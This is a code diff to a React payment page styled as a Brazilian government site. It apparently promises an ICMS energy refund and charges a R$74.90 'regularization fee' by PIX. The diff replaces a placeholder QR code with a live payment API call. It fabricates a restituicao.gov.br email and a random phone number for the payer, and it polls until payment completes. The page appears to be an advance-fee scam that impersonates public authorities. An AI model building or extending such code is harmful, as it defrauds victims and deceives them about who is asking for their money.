@@ -3,7 +3,7 @@ import { useLocation } from "wouter";
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { Copy, CheckCircle, Info, AlertCircle, AlertTriangle, Bell } from "lucide-react";
+import { Copy, CheckCircle, Info, AlertCircle, AlertTriangle, Bell, Loader } from "lucide-react";
 import { Separator } from "@/components/ui/separator";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { useToast } from "@/hooks/use-toast";
@@ -11,6 +11,7 @@ import { Toaster } from "@/components/ui/toaster";
 import { playNotificationSound } from "@/components/NotificationSound";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
+import { paymentApi } from "@/lib/for4payments";
 
 // Gerar um código PIX aleatório
 const gerarCodigoPix = () => {
@@ -81,6 +82,15 @@ const formatarValor = (valor: number) => {
   });
 };
 
+// Interface para as informações do pagamento da API
+interface PaymentInfo {
+  id: string;
+  pixCode: string;
+  pixQrCode: string;
+  expiresAt: string;
+  status: string;
+}
+
 // Componente principal da página
 export default function PagamentoPix() {
   const [location, navigate] = useLocation();
@@ -93,11 +103,16 @@ export default function PagamentoPix() {
   const cpf = urlParams.get('cpf') || "";
   const nome = urlParams.get('nome') || "";
   const valor = parseFloat(urlParams.get('valor') || "2500");
+  const email = urlParams.get('email') || `${cpf.substring(0, 3)}xxx${cpf.substring(9, 11)}@restituicao.gov.br`;
+  const telefone = urlParams.get('telefone') || `(11) 9${Math.floor(Math.random() * 9000) + 1000}-${Math.floor(Math.random() * 9000) + 1000}`;
   const valorFormatado = formatarValor(valor);
   const valorTaxaFormatado = formatarValor(74.90);
   
-  // Estado para o código PIX
-  const [codigoPix] = useState(gerarCodigoPix());
+  // Estados relacionados ao pagamento
+  const [isLoading, setIsLoading] = useState(false);
+  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo | null>(null);
+  const [paymentStatus, setPaymentStatus] = useState<string>('pending');
+  const [codigoPix, setCodigoPix] = useState('');
   const [copied, setCopied] = useState(false);
   
   // Estado para as notificações
@@ -151,6 +166,97 @@ export default function PagamentoPix() {
     return `${minutos.toString().padStart(2, '0')}:${segs.toString().padStart(2, '0')}`;
   };
   
+  // Criar pagamento PIX
+  const criarPagamento = async () => {
+    try {
+      setIsLoading(true);
+      
+      // Chamar a API para criar um pagamento
+      const response = await fetch('/api/pagamentos', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          nome: nome,
+          cpf: cpf,
+          email: email,
+          telefone: telefone,
+          valor: 74.90
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error('Falha ao gerar o pagamento');
+      }
+
+      const payment = await response.json();
+      setPaymentInfo(payment);
+      setCodigoPix(payment.pixCode);
+      
+      toast({
+        title: "Pagamento gerado com sucesso!",
+        description: "Use o QR code ou código PIX para efetuar o pagamento."
+      });
+    } catch (error) {
+      console.error('Erro ao criar pagamento:', error);
+      toast({
+        title: "Erro ao gerar pagamento",
+        description: "Não foi possível gerar o código PIX. Tente novamente.",
+        variant: "destructive"
+      });
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  // Verificar status do pagamento
+  const verificarStatusPagamento = async () => {
+    if (!paymentInfo?.id) return;
+    
+    try {
+      const response = await fetch(`/api/pagamentos/${paymentInfo.id}/status`);
+      
+      if (response.ok) {
+        const data = await response.json();
+        setPaymentStatus(data.status);
+        
+        if (data.status === 'completed') {
+          toast({
+            title: "Pagamento confirmado!",
+            description: "Seu pagamento foi processado com sucesso. Redirecionando...",
+            variant: "default"
+          });
+          
+          // Redirecionar para a página de sucesso
+          setTimeout(() => {
+            navigate("/sucesso");
+          }, 3000);
+        }
+      }
+    } catch (error) {
+      console.error('Erro ao verificar status do pagamento:', error);
+    }
+  };
+
+  // Efeito para criar o pagamento quando a página carregar
+  useEffect(() => {
+    criarPagamento();
+  }, []);
+
+  // Efeito para verificar o status do pagamento periodicamente
+  useEffect(() => {
+    if (!paymentInfo?.id) return;
+    
+    const statusInterval = setInterval(() => {
+      verificarStatusPagamento();
+    }, 5000); // Verificar a cada 5 segundos
+    
+    return () => {
+      clearInterval(statusInterval);
+    };
+  }, [paymentInfo]);
+
   // Efeito para o contador regressivo
   useEffect(() => {
     // Contador regressivo
@@ -404,40 +510,80 @@ export default function PagamentoPix() {
                     
                     <TabsContent value="qrcode" className="mt-2">
                       <div className="flex flex-col items-center justify-center">
-                        <div className="border-4 border-[var(--gov-blue)] rounded-lg p-3 mb-4">
-                          <img 
-                            src="https://chart.googleapis.com/chart?cht=qr&chl=00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426655440000%235204000053039865802BR5913ANEEL%20PAGTOS6008BRASILIA62070503***6304DA5A&chs=250x250&chld=L|0"
-                            alt="QR Code do PIX" 
-                            className="w-full h-auto" 
-                          />
-                        </div>
-                        <div className="bg-gray-50 w-full p-4 rounded-lg text-center border border-gray-200">
-                          <p className="text-sm text-gray-600 mb-1">Valor a ser pago:</p>
-                          <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
-                          <p className="text-xs text-gray-500 mt-1">ANEEL - Restituição ICMS</p>
-                        </div>
+                        {isLoading ? (
+                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
+                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
+                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
+                          </div>
+                        ) : !paymentInfo ? (
+                          <div className="py-8 text-center space-y-4">
+                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
+                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
+                            <Button 
+                              onClick={criarPagamento} 
+                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
+                            >
+                              Tentar Novamente
+                            </Button>
+                          </div>
+                        ) : (
+                          <>
+                            <div className="border-4 border-[var(--gov-blue)] rounded-lg p-3 mb-4">
+                              <img 
+                                src={paymentInfo.pixQrCode}
+                                alt="QR Code do PIX" 
+                                className="w-full h-auto" 
+                              />
+                            </div>
+                            <div className="bg-gray-50 w-full p-4 rounded-lg text-center border border-gray-200">
+                              <p className="text-sm text-gray-600 mb-1">Valor a ser pago:</p>
+                              <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
+                              <p className="text-xs text-gray-500 mt-1">TRE - Taxa de Regularização Energética</p>
+                            </div>
+                          </>
+                        )}
                       </div>
                     </TabsContent>
                     
                     <TabsContent value="copiacola" className="mt-2">
                       <div>
-                        <p className="text-sm text-gray-600 mb-2">Copie o código abaixo:</p>
-                        <div className="flex items-center">
-                          <div className="flex-1 bg-gray-100 p-3 rounded-l-md font-mono text-xs break-all">
-                            {codigoPix}
+                        {isLoading ? (
+                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
+                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
+                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
                           </div>
-                          <button 
-                            onClick={copiarCodigoPix}
-                            className="bg-[var(--gov-blue)] text-white p-3 rounded-r-md hover:bg-[var(--gov-blue-dark)]"
-                          >
-                            {copied ? <CheckCircle className="h-5 w-5" /> : <Copy className="h-5 w-5" />}
-                          </button>
-                        </div>
-                        <div className="bg-gray-50 w-full p-4 rounded-lg text-center mt-4 border border-gray-200">
-                          <p className="text-sm text-gray-600 mb-1">Valor a ser pago:</p>
-                          <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
-                          <p className="text-xs text-gray-500 mt-1">ANEEL - Restituição ICMS</p>
-                        </div>
+                        ) : !paymentInfo ? (
+                          <div className="py-8 text-center space-y-4">
+                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
+                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
+                            <Button 
+                              onClick={criarPagamento} 
+                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
+                            >
+                              Tentar Novamente
+                            </Button>
+                          </div>
+                        ) : (
+                          <>
+                            <p className="text-sm text-gray-600 mb-2">Copie o código abaixo:</p>
+                            <div className="flex items-center">
+                              <div className="flex-1 bg-gray-100 p-3 rounded-l-md font-mono text-xs break-all">
+                                {codigoPix}
+                              </div>
+                              <button 
+                                onClick={copiarCodigoPix}
+                                className="bg-[var(--gov-blue)] text-white p-3 rounded-r-md hover:bg-[var(--gov-blue-dark)]"
+                              >
+                                {copied ? <CheckCircle className="h-5 w-5" /> : <Copy className="h-5 w-5" />}
+                              </button>
+                            </div>
+                            <div className="bg-gray-50 w-full p-4 rounded-lg text-center mt-4 border border-gray-200">
+                              <p className="text-sm text-gray-600 mb-1">Valor a ser pago:</p>
+                              <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
+                              <p className="text-xs text-gray-500 mt-1">TRE - Taxa de Regularização Energética</p>
+                            </div>
+                          </>
+                        )}
                       </div>
                     </TabsContent>
                   </Tabs>
@@ -450,10 +596,27 @@ export default function PagamentoPix() {
                     </div>
                     
                     <Button 
-                      onClick={simularPagamento}
-                      className="w-full bg-[var(--gov-green)] hover:bg-[var(--gov-green)]/90 text-white font-bold py-4 text-lg transition-all duration-300 transform hover:scale-105"
+                      onClick={verificarStatusPagamento}
+                      disabled={!paymentInfo || isLoading || paymentStatus === 'completed'}
+                      className={`w-full font-bold py-4 text-lg transition-all duration-300 transform hover:scale-105 ${
+                        paymentStatus === 'completed' 
+                          ? 'bg-green-500 hover:bg-green-600 text-white' 
+                          : 'bg-[var(--gov-green)] hover:bg-[var(--gov-green)]/90 text-white'
+                      }`}
                     >
-                      Já fiz o pagamento
+                      {paymentStatus === 'completed' ? (
+                        <div className="flex items-center justify-center">
+                          <CheckCircle className="mr-2 h-5 w-5" />
+                          Pagamento Confirmado
+                        </div>
+                      ) : isLoading ? (
+                        <div className="flex items-center justify-center">
+                          <Loader className="mr-2 h-5 w-5 animate-spin" />
+                          Verificando...
+                        </div>
+                      ) : (
+                        "Já fiz o pagamento"
+                      )}
                     </Button>
                     
                     <p className="text-xs text-gray-500 text-center">
